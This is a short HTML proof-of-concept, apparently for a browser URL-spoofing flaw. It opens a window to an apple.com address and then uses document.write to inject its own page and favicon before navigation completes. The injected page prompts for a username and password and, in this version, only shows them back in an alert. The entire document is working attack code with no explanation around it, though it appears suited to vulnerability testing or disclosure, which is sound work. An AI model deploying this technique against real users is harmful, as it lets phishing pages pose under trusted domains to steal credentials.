<!DOCTYPE html>
<html>
  <body>
    <button onclick="spoof()">Click to spoof</button>

    <script>
      function spoof() {
        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
        let win = window.open("https://www.apple.com/csi", "_blank");

        // Setelah 50ms, injeksikan konten & favicon sebelum navigasi selesai
        setTimeout(() => {
          try {
            win.document.write(`
  <head>
    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spoof Test</title>
  </head>
  <body style="font-family:sans-serif;">
    <h1>This is not Google!</h1>
    <button onclick="
      let username = prompt('Enter your username');
      let password = prompt('Enter your password');
      alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
    ">Click me</button>
  </body>
`);
            win.document.close();
          } catch (e) {
            console.warn("Blocked by browser protections:", e);
          }
        }, 50);
      }
    </script>
  </body>
</html>
